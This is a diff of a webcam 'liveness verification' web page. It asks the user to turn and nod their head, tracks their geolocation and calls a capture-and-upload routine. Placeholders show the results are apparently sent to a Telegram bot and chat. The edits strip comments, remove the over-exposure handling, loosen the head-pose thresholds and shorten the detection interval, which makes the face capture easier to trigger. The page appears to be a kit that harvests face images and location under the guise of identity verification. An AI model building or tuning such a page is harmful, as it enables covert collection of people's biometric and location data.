@@ -36,7 +36,6 @@
         video, canvas { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
         canvas { display: none; }
         
-        /* 智能动态补光层 */
         #flash-overlay {
             position: absolute; top: 0; left: 50%; transform: translateX(-50%);
             width: 100%; max-width: 380px; height: 280px; border-radius: 10px;
@@ -167,7 +166,6 @@
 </div>
 
 <script>
-    // ⚠️ 请在此处填入你的 Telegram Bot Token 与 Chat ID
     const TG_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
     const TG_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
@@ -184,7 +182,7 @@
     let userLocation = { lat: null, lng: null };
     let activeStream = null;
     let detector = null;
-    let currentLivenessState = 0; // 0: 左摇头, 1: 右摇头, 2: 上下点头, 3: 回到正脸
+    let currentLivenessState = 0; 
     let lastVoiceTime = 0;
     let isProcessing = false;
 
@@ -325,7 +323,6 @@
         }
     }
 
-    // 智能环境光线检测与动态补光/降光调节
     function adjustEnvironmentLighting(video) {
         try {
             const canvas = document.getElementById('canvas');
@@ -333,7 +330,7 @@
             const overlay = document.getElementById('flash-overlay');
             const lightTip = document.getElementById('env-light-tip');
 
-            canvas.width = 100; // 降低采样分辨率以提升性能
+            canvas.width = 100;
             canvas.height = 75;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
@@ -341,7 +338,6 @@
             let totalBrightness = 0;
             let data = imgData.data;
             
-            // 计算画面平均亮度 (YUV公式加权)
             for (let i = 0; i < data.length; i += 4) {
                 let r = data[i], g = data[i+1], b = data[i+2];
                 let brightness = 0.299 * r + 0.587 * g + 0.114 * b;
@@ -349,22 +345,13 @@
             }
             let avgBrightness = totalBrightness / (data.length / 4);
 
-            if (avgBrightness < 60) {
-                // 环境偏暗 -> 自动智能柔和补光
-                let fillFactor = Math.min(0.5, (60 - avgBrightness) / 60);
+            if (avgBrightness < 50) {
+                let fillFactor = Math.min(0.4, (50 - avgBrightness) / 50);
                 overlay.style.backgroundColor = "#ffffff";
                 overlay.style.opacity = fillFactor;
                 lightTip.textContent = `Environment Light: Dim (${Math.round(avgBrightness)}) - Auto Filling Light`;
                 lightTip.style.color = "#3b82f6";
-            } else if (avgBrightness > 200) {
-                // 环境过亮（强光/暴光） -> 自动降低过曝（模拟暗色柔和滤镜压暗）
-                let reduceFactor = Math.min(0.3, (avgBrightness - 200) / 100);
-                overlay.style.backgroundColor = "#000000";
-                overlay.style.opacity = reduceFactor;
-                lightTip.textContent = `Environment Light: Too Bright (${Math.round(avgBrightness)}) - Reducing Exposure`;
-                lightTip.style.color = "#f59e0b";
             } else {
-                // 光线适宜
                 overlay.style.opacity = 0;
                 lightTip.textContent = `Environment Light: Optimal (${Math.round(avgBrightness)})`;
                 lightTip.style.color = "#10b981";
@@ -387,16 +374,15 @@
         if (isProcessing) return;
         const statusMsg = document.getElementById('status-msg');
 
-        // 每次循环先检测当前环境光线，并自动补光或降光
         adjustEnvironmentLighting(video);
 
         try {
+            // 优化：传入 video 元素进行识别
             const faces = await detector.estimateFaces(video, { flipHorizontal: false });
 
             if (!faces || faces.length === 0) {
-                speakText("No face detected. Please face the camera.");
-                statusMsg.textContent = "No face detected! Please look at the screen.";
-                statusMsg.style.color = "#ef4444";
+                statusMsg.textContent = "Searching for face... Please look straight.";
+                statusMsg.style.color = "#f59e0b";
             } else {
                 const keypoints = faces[0].keypoints;
                 const nose = keypoints[1];
@@ -415,7 +401,7 @@
                     statusMsg.textContent = "Action required: Please turn your head LEFT";
                     statusMsg.style.color = "#3b82f6";
                     
-                    if (horizontalOffset > 25 || horizontalOffset < -25) {
+                    if (horizontalOffset > 20 || horizontalOffset < -20) {
                         currentLivenessState = 1;
                         updateStepUI();
                         speakText("Great. Now please turn your head to the right.", true);
@@ -425,7 +411,7 @@
                     statusMsg.textContent = "Action required: Please turn your head RIGHT";
                     statusMsg.style.color = "#3b82f6";
 
-                    if (horizontalOffset > 25 || horizontalOffset < -25) {
+                    if (horizontalOffset > 20 || horizontalOffset < -20) {
                         currentLivenessState = 2;
                         updateStepUI();
                         speakText("Good. Now please nod up and down.", true);
@@ -435,7 +421,7 @@
                     statusMsg.textContent = "Action required: Please NOD up and down";
                     statusMsg.style.color = "#3b82f6";
 
-                    if (Math.abs(verticalOffset - 15) > 18) {
+                    if (Math.abs(verticalOffset - 15) > 15) {
                         currentLivenessState = 3;
                         updateStepUI();
                         speakText("Almost done. Please look straight ahead into the camera.", true);
@@ -445,7 +431,7 @@
                     statusMsg.textContent = "Perfect! Please hold still. Capturing...";
                     statusMsg.style.color = "#10b981";
 
-                    if (Math.abs(horizontalOffset) < 18 && Math.abs(verticalOffset - 15) < 15) {
+                    if (Math.abs(horizontalOffset) < 20 && Math.abs(verticalOffset - 15) < 15) {
                         isProcessing = true;
                         triggerCaptureAndUpload(video);
                         return;
@@ -457,7 +443,7 @@
         }
 
         if (!isProcessing) {
-            setTimeout(() => detectLivenessLoop(video), 400);
+            setTimeout(() => detectLivenessLoop(video), 300);
         }
     }
 
